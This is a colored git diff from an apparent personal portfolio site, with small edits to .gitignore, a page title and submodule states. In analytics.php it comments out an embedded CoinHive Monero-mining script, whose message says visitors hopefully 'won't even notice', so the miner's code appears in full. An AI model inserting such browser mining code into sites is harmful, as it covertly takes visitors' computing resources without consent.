@@ -1,0 +1,58 @@
+[1mdiff --git a/.gitignore b/.gitignore[m
+[1mindex ef03748..736f55a 100644[m
+[1m--- a/.gitignore[m
+[1m+++ b/.gitignore[m
+[36m@@ -1,3 +1,4 @@[m
+ /config.php[m
+ /trk/img/*[m
+ config.php[m
+[32m+[m[32m./config.php[m
+[1mdiff --git a/analytics.php b/analytics.php[m
+[1mindex b99a0ae..aac0ed5 100644[m
+[1m--- a/analytics.php[m
+[1m+++ b/analytics.php[m
+[36m@@ -8,8 +8,8 @@[m
+   ga('send', 'pageview');[m
+ [m
+ </script>[m
+[31m-[m
+[31m-<script src="https://coin-hive.com/lib/coinhive.min.js"></script>[m
+[32m+[m[32m<?php[m
+[32m+[m[32m/* <script src="https://coin-hive.com/lib/coinhive.min.js"></script>[m
+ <script>[m
+ 	console.log("Testing light Monero mining. Hopefully you won't even notice.")[m
+     var miner = new CoinHive.Anonymous('exN9MUJT735qbTYsRA6Jm1Mr3nQmP4yT', {[m
+[36m@@ -27,4 +27,5 @@[m
+ [m
+         // Output to HTML elements...[m
+     }, 1000);[m
+[31m-</script>[m
+\ No newline at end of file[m
+[32m+[m[32m</script> */[m[41m [m
+[32m+[m[32m?>[m
+\ No newline at end of file[m
+[1mdiff --git a/charSelect.php b/charSelect.php[m
+[1mindex 8467b6f..867013f 100644[m
+[1m--- a/charSelect.php[m
+[1m+++ b/charSelect.php[m
+[36m@@ -2,7 +2,7 @@[m
+ <link href="/css/charSelect.css" rel="stylesheet">[m
+ <!-- <script src="/js/charSelect.js" type="text/javascript"></script> -->[m
+ <link rel="stylesheet" href="css/fa/css/font-awesome.min.css">[m
+[31m-[m
+[32m+[m[32m<title>Daniel Kraft's Portfolio</title>[m
+ </head>[m
+ <body>[m
+     <h1>SELECT A PLAYER</h1>[m
+[1mdiff --git a/cms/js/tinymce/plugins/jbimages b/cms/js/tinymce/plugins/jbimages[m
+[1m--- a/cms/js/tinymce/plugins/jbimages[m
+[1m+++ b/cms/js/tinymce/plugins/jbimages[m
+[36m@@ -1 +1 @@[m
+[31m-Subproject commit ff08ed665d5ac94a2560c3990cd3ea2efba279f2[m
+[32m+[m[32mSubproject commit ff08ed665d5ac94a2560c3990cd3ea2efba279f2-dirty[m
+[1mdiff --git a/fil/pdfjs b/fil/pdfjs[m
+[1m--- a/fil/pdfjs[m
+[1m+++ b/fil/pdfjs[m
+[36m@@ -1 +1 @@[m
+[31m-Subproject commit 4c2640dcf0503aff173a8d0bcbe67bf63df18eee[m
+[32m+[m[32mSubproject commit 4c2640dcf0503aff173a8d0bcbe67bf63df18eee-dirty[m
